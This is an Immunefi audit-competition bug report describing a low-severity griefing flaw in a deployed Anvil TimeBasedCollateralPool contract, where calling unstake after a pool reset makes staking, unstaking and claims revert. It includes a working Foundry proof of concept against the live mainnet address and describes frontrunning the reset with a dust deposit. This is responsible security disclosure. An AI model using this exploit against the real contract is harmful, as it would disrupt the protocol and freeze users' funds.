# #36309 \[SC-Low] TimeBasedCollateralPool: After \_resetPool gets called (internally) a depositor can b

**Submitted on Oct 28th 2024 at 22:48:59 UTC by @max10afternoon for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36309
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

After a pool gets reset, a depositor can call unstake to intentionally (or unintentionally) break almost all functionalities of the smart contract, including staking and unstaking. Leading to a freezing of funds in cases were and ExitBalance is present, or to a general disruption of service otherwise.

## Vulnerability Details

When a pool gets reset the associated reservation ID gets set to 0, together with any pending epoch: \`\`\` function \_resetPool(address \_tokenAddress) internal { // Note: we are not calling \_unlockEligibleTokenContractPendingUnstakes because it can call this function.

```
    ContractState storage contractStateStorage &#x3D; tokenContractState[_tokenAddress];

    uint256 unitsToReset &#x3D; contractStateStorage.totalUnits;
    if (unitsToReset &#x3D;&#x3D; 0) {
        // This already has the state that a reset would achieve, so it&#x27;s not required.
        return;
    }

    // NB: must be resetNonce++, NOT ++resetNonce
    uint256 resetNonce &#x3D; contractStateStorage.resetNonce++;

    uint256 tokensToReset;
    {
        uint96 reservationId &#x3D; contractStateStorage.collateralReservationId;
        if (reservationId !&#x3D; 0) {
            // Unlock all pool tokens so they are releasable.
            tokensToReset &#x3D; collateral.releaseAllCollateral(reservationId);
            contractStateStorage.collateralReservationId &#x3D; 0;
        }
    }

    // Only set an Exit balance if there is one. If all tokens were claimed, then effectively set (0,0).
    if (tokensToReset &gt; 0) {
        // Create the reset ExitBalance so stakers can exit their tokens (see: _resetAccountTokenStateIfApplicable(...))
        tokenResetExitBalances[_tokenAddress][resetNonce] &#x3D; ExitBalance(unitsToReset, tokensToReset);
    }

    // Delete all contract-level pending unstake state.
    if (contractStateStorage.firstPendingUnstakeEpoch &gt; 0) {
        contractStateStorage.firstPendingUnstakeEpoch &#x3D; 0;
        contractStateStorage.firstPendingUnstakeUnits &#x3D; 0;

        if (contractStateStorage.secondPendingUnstakeEpoch &gt; 0) {
            contractStateStorage.secondPendingUnstakeEpoch &#x3D; 0;
            contractStateStorage.secondPendingUnstakeUnits &#x3D; 0;
        }
    }

    contractStateStorage.totalUnits &#x3D; 0;

    emit PoolReset(IERC20(_tokenAddress), resetNonce + 1, tokensToReset, unitsToReset);
}
```

\`\`\` This two facts will be relevant inside of the '\_unlockEligibleTokenContractPendingUnstakes', which gets called by all stake functionalities, unstake and claim. As calling unstake after the pool got reset will cause \_unlockEligibleTokenContractPendingUnstakes to revert braking all of the above functionalities, here is why:

As you may notice at the begging, if uint256 firstEpoch = contractStateStorage.firstPendingUnstakeEpoch; is 0, no further computations will be made, avoiding any unexpected revert, that would come from interacting with the underlying Collateral contract trough a reservation with ID equal to 0. That said a user can call unstake to froce the contractStateStorage.firstPendingUnstakeEpoch to be greater than 0\*\*, meaning that after the epoch elapses, the above mentioned check will pass and, unless someone have deposited before the time has passed, every functionality dependent on \_unlockEligibleTokenContractPendingUnstakes will revert, breaking almost every functionalities of the contract with respect to the targeted token and freezing any funds found in a potential ExitBalance allocation until the implementation gets re deployed (with the owner's time lock currently having a min delay of 7 days).

\*\*Note that the check performed inside of unstake, to verify if the account was reset will be ignored, as when epoch is equal to 0, the \_poolWasReset variable will be set to false, meaning that accountWasReset will also be set to false, allowing the execution to reach the critical \_addToContractPendingUnstakeNextEpoch function.

All of this can be done maliciously do damage the users and owners of the protocol (even by frontrunning the pool's reset with a dust amount deposit, see PoC) or by mistake by a user trying to legitimately call unstake.

## Impact Details

Griefing: A malicious user can decide to break most functionalities of the contract either by having some funds staked already of by frontrunning (for almost no cost). Also this might lead to a temporary freezing of funds in cases were an ExitBalance was allocated.

## Proof of Concept

Here is a simple foundry PoC interacting directly with the in scope assets (0xd042C267758eDDf34B481E1F539d637e41db3e5a) after properly initializing it, any interaction trough a proxy would lead to the same results.

Place your alchemy API key in the URL on line 119 of the script: \`\`\` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;

import "forge-std/Test.sol"; import "forge-std/console.sol";

interface IStruct{

```
struct CollateralizableContractApprovalConfig {
    address collateralizableAddress;
    bool isApproved;
}


struct AccountState {
    uint32 resetNonce;
    uint32 firstPendingUnstakeEpoch;
    uint32 secondPendingUnstakeEpoch;
    uint256 firstPendingUnstakeUnits;
    uint256 secondPendingUnstakeUnits;
    uint256 totalUnits;
}
```

} interface IERC20 {

```
event Transfer(address indexed from, address indexed to, uint256 value);

event Approval(address indexed owner, address indexed spender, uint256 value);


function totalSupply() external view returns (uint256);

function balanceOf(address account) external view returns (uint256);

function transfer(address to, uint256 value) external returns (bool);

function allowance(address owner, address spender) external view returns (uint256);

function approve(address spender, uint256 value) external returns (bool);

function transferFrom(address from, address to, uint256 value) external returns (bool);
```

}

interface ICollateral is IStruct{

```
function depositAndApprove(
    address[] calldata _tokenAddresses,
    uint256[] calldata _amounts,
    address _collateralizableContractAddressToApprove
) external ;

function upsertCollateralizableContractApprovals(
    CollateralizableContractApprovalConfig[] calldata _updates
) external;
```

}

interface ITimeBasedCollateralPool is IStruct {

```
function defaultClaimDestinationAccount() external view returns (address);

function initialize(
    ICollateral _collateral,
    uint256 _epochPeriodSeconds,
    address _defaultClaimDestination,
    address _admin,
    address _claimant,
    address _claimRouter,
    address _resetter
) external;

function stake(
    IERC20 _token,
    uint256 _amount,
    bytes calldata _collateralizableApprovalSignature
) external;


function unstake(IERC20 _token, uint256 _poolUnits) external;

function getAccountTokenState(address _account, address _tokenAddress) external view returns (AccountState memory);

function resetPool(IERC20[] calldata _tokens) external;

function getCurrentEpoch() external view returns (uint256);
```

}

contract DoSTest is Test, IStruct{

```
uint256 mainnetFork;

address vaultAddress;
address poolAddress;
address depositTokenAddress;

address alice;
address bob;

IERC20 depositToken;
ICollateral vault;
ITimeBasedCollateralPool pool;


uint256[] amounts;
address[] addresses;
IERC20[] resetToken; 
CollateralizableContractApprovalConfig[] collAdd;


function setUp() public {

    mainnetFork &#x3D; vm.createFork(&quot;https://eth-mainnet.g.alchemy.com/v2/&lt;Place your Alchemy API key here&gt;&quot;);

    depositTokenAddress &#x3D; address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    vaultAddress &#x3D;        address(0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f);   
    poolAddress &#x3D;         address(0xd042C267758eDDf34B481E1F539d637e41db3e5a);

    alice &#x3D; address(0x123);
    bob &#x3D; address(0x456);


    vm.selectFork(mainnetFork);
    vm.rollFork(20929936); //1 block before initialization, to skip proxy and make PoC interact directly with in scope asset

  

    vault &#x3D; ICollateral(vaultAddress);
    pool &#x3D; ITimeBasedCollateralPool(poolAddress);
    depositToken &#x3D; IERC20(depositTokenAddress);


    vm.prank(0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341);
    depositToken.transfer(alice, 500000000);

    vm.prank(alice);
    depositToken.approve(vaultAddress, type(uint256).max);


    vm.prank(0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341);
    depositToken.transfer(bob, 500000000);

    vm.prank(bob);
    depositToken.approve(vaultAddress, type(uint256).max);



    //Init with dummy numbers just to show impact
    pool.initialize(vault, 1, address(this),address(this),address(this),address(this),address(this));




    collAdd.push(CollateralizableContractApprovalConfig(poolAddress, true));

    vm.prank(address(0x4eeB7c5BB75Fc0DBEa4826BF568FD577f62cad21));
    vault.upsertCollateralizableContractApprovals(collAdd);

}



function testRevert() public {


    bytes memory empty;


    amounts &#x3D; [50000000];
    addresses &#x3D; [depositTokenAddress];



    vm.startPrank(alice);

    vault.depositAndApprove(addresses, amounts, poolAddress);
    pool.stake(depositToken,10, empty);

    vm.stopPrank();



    vm.startPrank(bob);

    vault.depositAndApprove(addresses, amounts, poolAddress);
    pool.stake(depositToken,20000000, empty);

    vm.stopPrank();
           
    
    resetToken.push(depositToken);
    pool.resetPool(resetToken);



    vm.prank(alice);
    pool.unstake(depositToken,1);

   
    vm.warp(block.timestamp + 2);



    //Alice was able to disable the smart contract functionalities
    vm.startPrank(bob);

    vault.depositAndApprove(addresses, amounts, poolAddress);

    vm.expectRevert();
    pool.stake(depositToken,20000000, empty);

  
    vm.expectRevert();
    pool.unstake(depositToken,1);

    vm.stopPrank();


}
```

}

\`\`\`
